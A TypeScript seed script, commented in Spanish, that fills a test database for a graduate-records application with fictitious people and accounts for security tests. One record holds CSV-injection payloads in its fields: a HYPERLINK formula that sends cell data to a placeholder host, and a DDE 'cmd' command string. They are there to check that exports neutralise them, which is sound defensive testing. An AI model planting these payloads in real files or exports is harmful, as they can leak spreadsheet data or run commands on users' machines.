/**
 * Datos FICTICIOS para la validación en ejecución.
 *
 * Este archivo vive en `calidadpruebas/src` y NO forma parte de la aplicación: solo
 * se ejecuta contra la base de pruebas, que se crea y se destruye en el mismo proceso.
 *
 * Qué siembra:
 *   · Un titular TITULADO y uno EGRESADO con contraseña conocida, para las pruebas de
 *     sesión, aislamiento (IDOR) y consentimiento.
 *   · Un SEGUNDO titular, para comprobar que el primero NO puede leer su ficha.
 *   · Un grupo de una sola persona en una cohorte propia, para verificar que un conteo
 *     de 1 se publica (decisión del dueño del sistema: no hay umbral k).
 *   · Una fila con texto de CSV injection, para comprobar que sale neutralizada.
 *
 * Los datos son inventados y claramente identificables como tales.
 */
import { db } from "../../../src/db";
import { personas, usuarios } from "../../../src/db/schema";
import { hashPassword } from "../../../src/lib/password";
import { verificarCadenaAuditoria } from "../../../src/lib/auditoria";
import { sql } from "drizzle-orm";

const CLAVE_TITULAR = "clave-de-prueba-123";
const CLAVE_KARDEX = "clave-kardex-prueba-123";

interface PersonaSeed {
  ci: string;
  nombre: string;
  tipo: "TITULADO" | "EGRESADO";
  cohorte: string;
  sector?: string | null;
  ocupacion?: string | null;
}

const PERSONAS: PersonaSeed[] = [
  {
    ci: "90000001",
    nombre: "PERSONA FICTICIA TITULADO UNO",
    tipo: "TITULADO",
    cohorte: "I/2010",
    sector: "PUBLICO",
    ocupacion: "Estadistico municipal",
  },
  {
    ci: "90000002",
    nombre: "PERSONA FICTICIA EGRESADO UNO",
    tipo: "EGRESADO",
    cohorte: "I/2011",
    sector: "PRIVADO",
    ocupacion: "Analista de datos",
  },
  {
    // Su ficha es la que el segundo titular NO debe poder leer.
    ci: "90000003",
    nombre: "PERSONA FICTICIA TITULADO DOS",
    tipo: "TITULADO",
    cohorte: "I/2012",
    sector: "ACADEMICO",
  },
  {
    // Única persona de su cohorte: sirve para comprobar que un grupo de 1 se publica.
    ci: "90000004",
    nombre: "PERSONA FICTICIA GRUPO UNICO",
    tipo: "TITULADO",
    cohorte: "XX/2099",
    sector: "ONG",
  },
  {
    // Texto de CSV injection: debe salir neutralizado en las exportaciones.
    ci: "90000005",
    nombre: 'PERSONA FICTICIA FORMULA =HYPERLINK("http://x/?d="&A1,"clic")',
    tipo: "EGRESADO",
    cohorte: "II/2015",
    sector: "PRIVADO",
    ocupacion: "=cmd|' /C calc'!A0",
  },
];

async function main() {
  for (const p of PERSONAS) {
    const existente = await db
      .select({ id: personas.id })
      .from(personas)
      .where(sql`upper(${personas.cedulaIdentidad}) = ${p.ci}`)
      .limit(1);

    if (!existente.length) {
      await db.insert(personas).values({
        cedulaIdentidad: p.ci,
        nombresApellidos: p.nombre,
        tipo: p.tipo,
        genero: "FEMENINO",
        semestreIngreso: p.cohorte.includes("/") ? p.cohorte : `${p.cohorte}/2010`,
        anioEgreso: p.tipo === "EGRESADO" ? 2016 : null,
        anioTitulacion: p.tipo === "TITULADO" ? 2015 : null,
        modalidadTitulacion: "Tesis",
        sectorTrabajo: (p.sector ?? null) as never,
        ocupacionCargo: p.ocupacion ?? null,
        estadoLaboral: p.sector ? "EMPLEADO" : null,
        activo: true,
        estadoRegistro: "VALIDADO",
        consentimientoOtorgado: true,
        consentimientoOtorgadoEn: new Date(),
        consentimientoVersion: "1.0.0",
      });
    }

    const cuenta = await db
      .select({ id: usuarios.id })
      .from(usuarios)
      .where(sql`upper(${usuarios.ci}) = ${p.ci}`)
      .limit(1);
    if (!cuenta.length) {
      await db.insert(usuarios).values({
        ci: p.ci,
        nombre: p.nombre,
        correo: `titular${p.ci}@example.invalid`,
        passwordHash: hashPassword(CLAVE_TITULAR),
        // `usuario_rol_enum` solo admite admin/usuario/KARDEX. El rol TITULADO o
        // EGRESADO de la sesión no sale de esta tabla, sino del `tipo` de la persona:
        // por eso la cuenta del titular es "usuario" y su ficha define el portal.
        rol: "usuario",
        estado: "activo",
      });
    }
  }

  // Cuenta Kardex: sin ella no se puede probar la matriz de roles completa.
  const kardex = await db
    .select({ id: usuarios.id })
    .from(usuarios)
    .where(sql`lower(${usuarios.correo}) = 'kardex@example.invalid'`)
    .limit(1);
  if (!kardex.length) {
    await db.insert(usuarios).values({
      ci: null,
      nombre: "USUARIO FICTICIO KARDEX",
      correo: "kardex@example.invalid",
      passwordHash: hashPassword(CLAVE_KARDEX),
      rol: "KARDEX",
      estado: "activo",
    });
  }

  const total = await db.select({ n: sql`count(*)::int` }).from(personas);
  const cadena = await verificarCadenaAuditoria();
  console.log(
    `datos de prueba listos: ${total[0]?.n ?? 0} personas · ` +
      `cadena de auditoría ${cadena.cadenaIntegra ? "íntegra" : "ROTA"}`
  );
}

main()
  .then(() => process.exit(0))
  .catch((e) => {
    console.error("fallo al sembrar datos de prueba:", e);
    process.exit(1);
  });